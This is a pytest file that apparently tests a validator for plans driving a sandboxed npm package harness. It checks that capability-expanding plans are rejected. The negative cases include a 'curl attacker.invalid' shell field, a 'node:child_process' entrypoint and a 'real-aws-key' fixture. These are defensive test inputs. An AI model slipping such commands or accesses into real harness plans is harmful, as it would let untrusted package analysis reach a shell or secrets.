from __future__ import annotations

import pytest

from npm_adaptive.harness_renderer import render_harness
from npm_adaptive.models import PackageEntrypoint, PackageExport, PackageMap
from npm_adaptive.plan_schema import (
    PLAN_SCHEMA_VERSION,
    HarnessPlanValidationError,
    validate_harness_plan,
)


@pytest.fixture
def package_map() -> PackageMap:
    return PackageMap(
        artifact_sha256="a" * 64,
        package_name="demo-pkg",
        package_version="1.0.0",
        module_type="module",
        entrypoints=[
            PackageEntrypoint(
                specifier="demo-pkg",
                source="exports",
                import_path="index.mjs",
            )
        ],
        exports=[
            PackageExport(
                entrypoint="demo-pkg",
                name="parse",
                kind="function",
                source_path="index.mjs",
                confidence="high",
                parameters=["value"],
            )
        ],
        static_findings=[],
        unsupported_paths=[],
    )


def _valid_plan():
    return {
        "schema_version": PLAN_SCHEMA_VERSION,
        "profile_id": "node-library-v1",
        "attempt_budget": 1,
        "actions": [
            {
                "entrypoint": "demo-pkg",
                "loader": "import",
                "export_name": "parse",
                "operation": "call",
                "fixtures": ["string-basic"],
                "timeout_ms": 1000,
            }
        ],
    }


def test_validated_plan_renders_only_trusted_harness_code(package_map: PackageMap):
    plan = validate_harness_plan(_valid_plan(), package_map)
    source = render_harness(plan)

    assert "child_process" not in source
    assert "TRACE_TREE_ACTION_TIMEOUT" in source
    assert "demo-pkg" in source
    assert "tracetree-synthetic-input" in source


@pytest.mark.parametrize(
    "mutate, message",
    [
        (lambda plan: plan.update({"profile_id": "cloud-admin-v99"}), "unknown environment profile"),
        (
            lambda plan: plan["actions"][0].update({"entrypoint": "node:child_process"}),
            "unknown entrypoint",
        ),
        (
            lambda plan: plan["actions"][0].update({"loader": "require"}),
            "loader is unavailable",
        ),
        (
            lambda plan: plan["actions"][0].update({"fixtures": ["real-aws-key"]}),
            "fixtures unavailable",
        ),
        (
            lambda plan: plan["actions"][0].update({"fixtures": ["string-basic", "json-empty-object"]}),
            "more fixtures than statically known parameters",
        ),
        (
            lambda plan: plan["actions"][0].update({"shell": "curl attacker.invalid"}),
            "unsupported fields",
        ),
    ],
)
def test_plan_validator_rejects_capability_expansion(package_map: PackageMap, mutate, message):
    raw = _valid_plan()
    mutate(raw)

    with pytest.raises(HarnessPlanValidationError, match=message):
        validate_harness_plan(raw, package_map)
